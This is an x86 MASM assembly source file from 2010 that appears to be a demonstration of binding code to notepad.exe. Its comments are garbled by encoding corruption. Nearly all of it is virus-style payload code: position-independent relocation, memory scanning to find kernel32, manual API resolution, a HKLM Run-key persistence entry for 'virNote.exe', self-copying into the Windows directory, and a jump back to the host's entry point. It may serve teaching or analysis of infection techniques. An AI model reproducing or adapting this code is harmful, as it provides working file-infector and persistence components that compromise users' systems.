;------------------------
; ���ܣ��ļ��Ͳ��� ��ʾ��
;       �ؼ����뽫���ӵ�notepad.exe�ļ����һ����
; ���ߣ�����
; �������ڣ�2010.7.20
;------------------------
    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc
include    kernel32.inc
includelib kernel32.lib
include    ADVAPI32.inc
includelib ADVAPI32.lib

_ProtoRegCreateKey            typedef proto :dword,:dword,:dword
_ProtoRegSetValueEx           typedef proto :dword,:dword,:dword,:dword,:dword,:dword
_ProtoRegCloseKey             typedef proto :dword
_ProtoMessageBox              typedef proto :dword,:dword,:dword,:dword
_ProtoGetWindowsDirectory     typedef proto :dword,:dword
_ProtoGetModuleFileName       typedef proto :dword,:dword,:dword
_ProtoCopyFile                typedef proto :dword,:dword,:dword
_ProtoCreateFile              typedef proto :dword,:dword,:dword,:dword,:dword,:dword,:dword
_ProtoGetFileSize             typedef proto :dword,:dword
_ProtoCreateFileMapping       typedef proto :dword,:dword,:dword,:dword,:dword,:dword
_ProtoDeleteFile              typedef proto :dword
_ProtoMapViewOfFile           typedef proto :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
_ProtoUnmapViewOfFile         typedef proto :dword
_ProtoCloseHandle             typedef proto :dword
_ProtoGetProcAddress          typedef proto :dword,:dword
_ProtoLoadLibraryA            typedef proto :dword



_ApiRegCreateKey              typedef ptr _ProtoRegCreateKey
_ApiRegSetValueEx             typedef ptr _ProtoRegSetValueEx
_ApiRegCloseKey               typedef ptr _ProtoRegCloseKey
_ApiMessageBox                typedef ptr _ProtoMessageBox
_ApiGetWindowsDirectory       typedef ptr _ProtoGetWindowsDirectory
_ApiGetModuleFileName         typedef ptr _ProtoGetModuleFileName
_ApiCopyFile                  typedef ptr _ProtoCopyFile
_ApiCreateFile                typedef ptr _ProtoCreateFile
_ApiGetFileSize               typedef ptr _ProtoGetFileSize
_ApiCreateFileMapping         typedef ptr _ProtoCreateFileMapping
_ApiDeleteFile                typedef ptr _ProtoDeleteFile
_ApiMapViewOfFile             typedef ptr _ProtoMapViewOfFile
_ApiUnmapViewOfFile           typedef ptr _ProtoUnmapViewOfFile
_ApiCloseHandle               typedef ptr _ProtoCloseHandle
_ApiGetProcAddress            typedef ptr _ProtoGetProcAddress
_ApiLoadLibraryA              typedef ptr _ProtoLoadLibraryA

    .code

jmp _NewEntry

lpszKey             db   'SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\Run',0  
lpszValueName       db   'note',0  
lpszValue           db   'virNote.exe',0  
hKey                dd   ?
hFile               dd   ?
hMapFile            dd   ?
lpMemory            dd   ?   ;�ڴ����ļ�ָ��

hDllADVAPI32        dd   ?   ;���advapi32.dll���
hDllUser32          dd   ?   ;���user32.dll���
hDllKernel32        dd   ?   ;���kernel32.dll���


@destFile           db   50h dup(0)
szBuffer            db   50h dup(0)
dwFileSize          dd   ?   ;����ļ���С
_dwSize             dd   ?
dwIsChanged         dd   ?   ;�ļ��Ƿ��޸�

_RegCreateKey             _ApiRegCreateKey           ?
_RegSetValueEx            _ApiRegSetValueEx          ?
_RegCloseKey              _ApiRegCloseKey            ?
_MessageBox               _ApiMessageBox             ?
_GetWindowsDirectory      _ApiGetWindowsDirectory    ?
_GetModuleFileName        _ApiGetModuleFileName      ?
_CopyFile                 _ApiCopyFile               ?
_CreateFile               _ApiCreateFile             ?
_GetFileSize              _ApiGetFileSize            ?
_CreateFileMapping        _ApiCreateFileMapping      ?
_DeleteFile               _ApiDeleteFile             ?
_MapViewOfFile            _ApiMapViewOfFile          ?
_UnmapViewOfFile          _ApiUnmapViewOfFile        ?
_CloseHandle              _ApiCloseHandle            ?
_GetProcAddress           _ApiGetProcAddress         ?
_LoadLibraryA             _ApiLoadLibraryA           ?
 


szADVAPI32               db  'ADVAPI32.dll',0
szUser32                 db  'USER32.dll',0
szKernel32               db  'KERNEL32.dll',0
szRegCreateKey           db  'RegCreateKeyA',0        ;�÷�����ADVAPI32.dll��
szRegSetValueEx          db  'RegSetValueExA',0       ;�÷�����ADVAPI32.dll��
szRegCloseKey            db  'RegCloseKey',0       ;�÷�����ADVAPI32.dll��
szMessageBox             db  'MessageBoxA',0          ;�÷�����USER32.dll��
szGetWindowsDirectory    db  'GetWindowsDirectoryA',0 ;���·�����KERNEL32.dll��
szGetModuleFileName      db  'GetModuleFileNameA',0
szCopyFile               db  'CopyFileA',0
szCreateFile             db  'CreateFileA',0
szGetFileSize            db  'GetFileSize',0
szCreateFileMapping      db  'CreateFileMappingA',0
szDeleteFile             db  'DeleteFileA',0
szMapViewOfFile          db  'MapViewOfFile',0
szUnmapViewOfFile        db  'UnmapViewOfFile',0
szCloseHandle            db  'CloseHandle',0
szGetProcAddress         db  'GetProcAddress',0
szLoadLibraryA           db  'LoadLibraryA',0

lpszTitle         db  '�ļ�������ʾ��-by qixiaorui',0
lpszMessage       db  '��ע�⣡���Ļ�������һ��ʹ��ʱ�����Ѿ���Ⱦ���ļ��Ͳ�����',0
lpszNewName       db  '\virNote_Bak.exe',0


;-----------------------------
; ���� Handler
;-----------------------------------------
_SEHHandler proc _lpException,_lpSEH,_lpContext,_lpDispatcher
  pushad
  mov esi,_lpException
  mov edi,_lpContext
  assume esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
  mov eax,_lpSEH
  push [eax+0ch]
  pop [edi].regEbp
  push [eax+8]
  pop [edi].regEip
  push eax
  pop [edi].regEsp
  assume esi:nothing,edi:nothing
  popad
  mov eax,ExceptionContinueExecution
  ret
_SEHHandler endp

;-------------------------------------------
; ���ڴ���ɨ�� Kernel32.dll �Ļ�ַ
; ��ָ���Ļ�ַ����ߵ�ַ������
;-------------------------------------------

_getKernelBase proc _dwKernelRet
  local @dwReturn
  
  pushad
  mov @dwReturn,0

  ;�ض�λ
  call @F
@@:
  pop ebx
  sub ebx,offset @B

  ;�������ڴ������SEH�ṹ
  assume fs:nothing
  push ebp
  lea eax,[ebx+offset _ret]
  push eax
  lea eax,[ebx+offset _SEHHandler]
  push eax
  push fs:[0]
  mov fs:[0],esp

  ;����kernel32.dll�Ļ�ַ
  mov edi,_dwKernelRet
  and edi,0ffff0000h   ;�ҵ����ص�ַ���ڴ�����ͷ
  .while TRUE
    .if word ptr [edi]==IMAGE_DOS_SIGNATURE
      mov esi,edi
      add esi,[esi+3ch]
      .if word ptr [esi]==IMAGE_NT_SIGNATURE
        mov @dwReturn,edi
        .break
      .endif
    .endif
_ret:
    sub edi,010000h             ;����һ���ڴ�ҳ�棬��������
    .break .if edi<070000000h   ;ֱ����ַС��070000000h
  .endw  
  pop fs:[0]
  add esp,0ch
  popad
  mov eax,@dwReturn
  ret
_getKernelBase endp

;------------------------------------------------
; ���ڴ���ģ��ĵ������л�ȡĳ�� API ����ڵ�ַ
;------------------------------------------------
_getApi  proc  _hModule,_lpszApi
  local @dwReturn,@dwStringLen
  
  pushad
  mov @dwReturn,0
  call @F
@@:
  pop ebx
  sub ebx,offset @B

  ;�������ڴ������SEH�ṹ
  assume fs:nothing
  push ebp
  lea eax,[ebx+offset _ret]
  push eax
  lea eax,[ebx+offset _SEHHandler]
  push eax
  push fs:[0]
  mov fs:[0],esp

  ;����API�ַ����ĳ��ȣ�ע���β����0��
  mov edi,_lpszApi
  mov ecx,-1
  xor al,al
  cld
  repnz scasb
  mov ecx,edi
  sub ecx,_lpszApi
  mov @dwStringLen,ecx
  ;��DLL�ļ�ͷ������Ŀ¼�л�ȡ�������λ��
  mov esi,_hModule
  add esi,[esi+3ch]
  assume esi:ptr IMAGE_NT_HEADERS
  mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
  add esi,_hModule
  assume esi:ptr IMAGE_EXPORT_DIRECTORY
  mov ebx,[esi].AddressOfNames
  add ebx,_hModule
  xor edx,edx
  .repeat
    push esi
    mov edi,[ebx]
    add edi,_hModule
    mov esi,_lpszApi
    mov ecx,@dwStringLen
    repz cmpsb
    .if ZERO?
      pop esi
      jmp @F
    .endif
    pop esi
    add ebx,4
    inc edx
  .until edx>=[esi].NumberOfNames
  jmp _ret
@@:
  ;API��������->�������->��ַ����
  sub ebx,[esi].AddressOfNames
  sub ebx,_hModule
  shr ebx,1
  add ebx,[esi].AddressOfNameOrdinals
  add ebx,_hModule
  movzx eax,word ptr [ebx]
  shl eax,2
  add eax,[esi].AddressOfFunctions
  add eax,_hModule
  ;�ӵ�ַ��õ�����������ַ
  mov eax,[eax]
  add eax,_hModule
  mov @dwReturn,eax
_ret:
  pop fs:[0]
  add esp,0ch
  assume esi:nothing
  popad
  mov eax,@dwReturn
  ret
_getApi  endp

;-----------------
; ��ȡ���ж�̬���ӿ�Ļ���ַ
;-----------------
_getDllBase proc
    pushad
    call @F   ; ��ȥ�ض�λ
@@:
    pop ebx
    sub ebx,offset @B

    nop

    ;ʹ��LoadLibrary��ȡuser32.dll�Ļ���ַ
    mov eax,offset szUser32
    add eax,ebx

    mov edx,[ebx+offset _LoadLibraryA]

    push eax
    call edx
    mov [ebx+offset hDllUser32],eax

    mov eax,offset szADVAPI32
    add eax,ebx
    mov edx,[ebx+offset _LoadLibraryA]
    push eax
    call edx
    mov [ebx+offset hDllADVAPI32],eax

    popad
    ret
_getDllBase endp

_getAllAPIs  proc
    pushad
    call @F   ; ��ȥ�ض�λ
@@:
    pop ebx
    sub ebx,offset @B

    ;ʹ��GetProcAddress��������ַ������������������GetProcAddress���������CreateDirA����ַ
    mov eax,offset szRegCreateKey
    add eax,ebx
    push eax
    push [ebx+hDllADVAPI32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_RegCreateKey],eax

    mov eax,offset szRegSetValueEx
    add eax,ebx
    push eax
    push [ebx+hDllADVAPI32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_RegSetValueEx],eax

    mov eax,offset szRegCloseKey
    add eax,ebx
    push eax
    push [ebx+hDllADVAPI32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_RegCloseKey],eax

    mov eax,offset szMessageBox
    add eax,ebx
    push eax
    push [ebx+hDllUser32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_MessageBox],eax


    mov eax,offset szGetWindowsDirectory
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_GetWindowsDirectory],eax


    mov eax,offset szGetModuleFileName
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_GetModuleFileName],eax

    mov eax,offset szCopyFile
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_CopyFile],eax

    mov eax,offset szCreateFile
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_CreateFile],eax


    mov eax,offset szGetFileSize
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_GetFileSize],eax

    mov eax,offset szCreateFileMapping
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_CreateFileMapping],eax

    mov eax,offset szDeleteFile
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_DeleteFile],eax

    mov eax,offset szMapViewOfFile
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_MapViewOfFile],eax

    mov eax,offset szUnmapViewOfFile
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_UnmapViewOfFile],eax

    mov eax,offset szCloseHandle
    add eax,ebx
    push eax
    push [ebx+hDllKernel32]
    mov edx,dword ptr [ebx+_GetProcAddress]
    call edx    
    mov dword ptr [ebx+_CloseHandle],eax


    
    popad
    ret
_getAllAPIs  endp


;----------------------------
; ����ǰ�ļ�������ϵͳĿ¼����д��ע���
; ����  0 ��ʾδ��������Ⱦ
;       1 ��ʾ�Ѿ���������Ⱦ
;----------------------------
_doCheck  proc   _base
    local @ret
    pushad
    mov ebx,_base

    ;��ֵд��ע���   
    lea eax,[ebx+hKey]
    push eax
    lea eax,[ebx+lpszKey]
    push eax
    push HKEY_LOCAL_MACHINE
    call [ebx+_RegCreateKey]
    mov eax,0Ch
    push eax
    lea eax,[ebx+lpszValue]
    push eax
    mov eax,REG_SZ
    push eax
    xor eax,eax
    push eax
    lea eax,[ebx+lpszValueName]
    push eax
    mov eax,[ebx+hKey]
    push eax
    call [ebx+_RegSetValueEx]
    mov eax,[ebx+hKey]
    push eax
    call [ebx+_RegCloseKey]

    ;��ȡϵͳ����Ŀ¼
    mov eax,50h
    push eax
    lea eax,[ebx+szBuffer]
    push eax
    call [ebx+_GetWindowsDirectory]

    mov esi,0      ;����Ŀ���ļ�����·��=Ŀ¼��+��\virNote_Bak.exe��
    mov edi,0
    .while TRUE
        mov al,byte ptr [ebx+szBuffer+esi]
        .break .if al==0
        mov byte ptr [ebx+@destFile+edi],al
        inc esi
        inc edi
    .endw
    mov esi,0
    .while TRUE
        mov al,byte ptr [ebx+lpszNewName+esi]
        .break .if al==0
        mov byte ptr [ebx+@destFile+edi],al
        inc esi
        inc edi
    .endw
    mov byte ptr [ebx+@destFile+edi],0   ;@destFile�д����Ŀ���ļ��ľ���·��

    ;ȡ��ǰ��������·��c:\winnt\virNote.exe
    mov eax,50h
    push eax
    lea eax,[ebx+szBuffer]
    push eax
    xor eax,eax
    push eax
    call [ebx+_GetModuleFileName]

    ;����ǰ���������ļ�szBuffer������ϵͳĿ¼@destFile
    mov eax,FALSE
    push eax
    lea eax,[ebx+@destFile]
    push eax
    lea eax,[ebx+szBuffer]
    push eax
    call [ebx+_CopyFile]

    ;������������ļ�@destFile
    push NULL
    mov eax,FILE_ATTRIBUTE_ARCHIVE
    push eax
    mov eax,OPEN_EXISTING
    push eax
    push NULL
    mov eax,FILE_SHARE_READ or FILE_SHARE_WRITE
    push eax
    mov eax,GENERIC_READ
    push eax
    lea eax,[ebx+@destFile]
    push eax
    call [ebx+_CreateFile]

    mov [ebx+hFile],eax   ;���ļ����������Ӧ����

    push NULL
    push eax
    call [ebx+_GetFileSize]
    mov [ebx+dwFileSize],eax

    ;�����ڴ�ӳ��
    xor eax,eax
    push eax
    push eax
    push eax
    mov eax,PAGE_READONLY
    push eax
    xor eax,eax
    push eax
    mov eax,[ebx+hFile]
    push eax
    call [ebx+_CreateFileMapping]
    mov [ebx+hMapFile],eax

    ;���ļ�ӳ�䵽�ڴ�
    xor eax,eax
    push eax
    push eax
    push eax
    mov eax,FILE_MAP_READ
    push eax
    mov eax,[ebx+hMapFile]
    push eax
    call [ebx+_MapViewOfFile]
    mov [ebx+lpMemory],eax     ;����ļ����ڴ�ӳ�����ʼλ��

    mov esi,[ebx+lpMemory]
    add esi,3ch  
    mov esi,dword ptr [esi]
    add esi,[ebx+lpMemory]     
    push esi
    pop edi                    ;esi��edi��ָ��PEͷ

    movzx ecx,word ptr [esi+6h] ;��ȡ�ڵ�����  
    mov eax,sizeof IMAGE_NT_HEADERS
    add edi,eax                ;ediָ���Ŀ¼
    
    ;�����Ŀ¼���ݵ��ܳ���
    mov eax,sizeof IMAGE_SECTION_HEADER
    xor edx,edx
    mul ecx
    xchg eax,ecx               ;ecx��Ϊ��Ŀ¼���ݵ��ܳ���
    
    ;�����ediָ���ecx�����ȵ��ֽڵ�У���   0F34Bh
_calcCheckSum:
 
    mov [ebx+_dwSize],ecx
    push esi
    shr ecx,1
    xor edx,edx
    mov esi,edi

    cld
@@:
    lodsw
    movzx eax,ax
    add edx,eax
    loop @B
    test [ebx+_dwSize],1
    jz @F
    lodsb
    movzx eax,al
    add edx,eax
@@:
    mov eax,edx
    and eax,0ffffh
    shr edx,16
    add eax,edx
    not ax
    pop esi    ;����Ϊֹ��ax�д�����µ�У���


    mov dx,word ptr [esi+4ch]   ;�˴������ԭʼ��У���
    sub ax,dx
    jz _ret      ;У���һ�£����ʾδ���޸�
    
    ;�����һ�£�����ʾ��ʾ��Ϣ
    xor eax,eax
    push eax
    lea eax,[ebx+lpszTitle]
    push eax
    lea eax,[ebx+lpszMessage]
    push eax
    push NULL
    call [ebx+_MessageBox]
    mov @ret,1
    jmp _ret1
_ret:
    mov @ret,0
_ret1:
    ;�ر��ļ�
    mov eax,[ebx+lpMemory]   
    push eax
    call [ebx+_UnmapViewOfFile]
 
    mov eax,[ebx+hMapFile]
    push eax
    call [ebx+_CloseHandle]

    mov eax,[ebx+hFile]
    push eax
    call [ebx+_CloseHandle]

    ;ɾ����ʱ�ļ�
    lea eax,[ebx+@destFile]
    push eax
    call [ebx+_DeleteFile]
    popad
    mov eax,@ret
    ret
_doCheck  endp

_start  proc
    ;eax�д���˵�ǰ�����Ķ�ջջ��ֵ
    push eax
    call @F   ; ��ȥ�ض�λ
@@:
    pop ebx
    sub ebx,offset @B
    pop eax
    ;��ȡkernel32.dll�Ļ���ַ
    invoke _getKernelBase,eax
    mov [ebx+offset hDllKernel32],eax

    ;�ӻ���ַ��������GetProcAddress��������ַ
    mov eax,offset szGetProcAddress
    add eax,ebx
    mov ecx,[ebx+offset hDllKernel32]
    invoke _getApi,ecx,eax
    mov [ebx+offset _GetProcAddress],eax   ;Ϊ�������ø�ֵ GetProcAddress

    ;ʹ��GetProcAddress��������ַ������������������GetProcAddress���������LoadLibraryA����ַ
    mov eax,offset szLoadLibraryA
    add eax,ebx
    
    push eax
    push [ebx+offset hDllKernel32]
    mov edx,[ebx+offset _GetProcAddress]
    call edx
    mov [ebx+offset _LoadLibraryA],eax

    invoke _getDllBase      ;��ȡ�����õ���dll�Ļ���ַ��kernel32����
    invoke _getAllAPIs      ;��ȡ�����õ��ĺ�������ڵ�ַ��GetProcAddress��LoadLibraryA����
    invoke _doCheck,ebx         ;ִ����������ĳ���
    ret
_start  endp

; EXE�ļ��µ���ڵ�ַ

_NewEntry:
    ;ȡ��ǰ�����Ķ�ջջ��ֵ
    mov eax,dword ptr [esp]
    push eax
    call @F   ; ��ȥ�ض�λ
@@:
    pop ebx
    sub ebx,offset @B
    pop eax
    invoke _start
    .if eax==0   ;δ����Ⱦ�������κ���ʾ��ֱ���˳�
       jmp _ret2
    .endif
    jmpToStart   db 0E9h,0F0h,0FFh,0FFh,0FFh
_ret2:
    ret
    end _NewEntry




















